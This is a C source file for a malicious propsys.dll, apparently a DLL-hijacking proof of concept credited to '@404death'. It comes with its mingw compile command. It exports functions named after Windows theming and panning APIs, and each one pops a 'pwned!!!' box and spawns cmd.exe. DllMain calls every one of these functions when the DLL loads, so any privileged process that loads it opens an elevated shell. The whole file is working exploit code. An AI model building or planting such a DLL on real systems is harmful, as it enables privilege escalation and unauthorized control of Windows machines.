#include <windows.h> 
#include <Winuser.h> 
 
// x86-w64-mingw32-gcc -shared -o propsys.dll propsys.c -lcomctl32 -Wl,--subsystem,windows  

//  @404death

int SetWindowTheme(){
    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("cmd.exe /c C:\\windows\\system32\\cmd.exe", 0);
    ExitProcess(0);
    return 0;
}
int GetThemeInt(){
    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("cmd.exe /c C:\\windows\\system32\\cmd.exe", 0);
    ExitProcess(0);
    return 0;
}
int GetThemeColor(){
    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("cmd.exe /c C:\\windows\\system32\\cmd.exe", 0);
    ExitProcess(0);
    return 0;
}
int OpenThemeData(){
    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("cmd.exe /c C:\\windows\\system32\\cmd.exe", 1);
    ExitProcess(0);
    return 0;
}
int UpdatePanningFeedback(){
    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("cmd.exe /c C:\\windows\\system32\\cmd.exe", 0);
    ExitProcess(0);
    return 0;
}
int BeginPanningFeedback(){
    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("cmd.exe /c C:\\windows\\system32\\cmd.exe", 0);
    ExitProcess(0);
    return 0;
}
int EndPanningFeedback(){
    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("cmd.exe /c C:\\windows\\system32\\cmd.exe", 0);
    ExitProcess(0);
    return 0;
}
int CloseThemeData(){
    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("cmd.exe /c C:\\windows\\system32\\cmd.exe", 0);
    ExitProcess(0);
    return 0;
}
BOOL WINAPI DllMain (HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)  
{  
  if (fdwReason == DLL_PROCESS_ATTACH)  
  {  
    SetWindowTheme(); 
    GetThemeInt();
    GetThemeColor();   
    OpenThemeData();
    UpdatePanningFeedback();
    BeginPanningFeedback();
    EndPanningFeedback();
    CloseThemeData();
  }  
  
  return TRUE;  
}  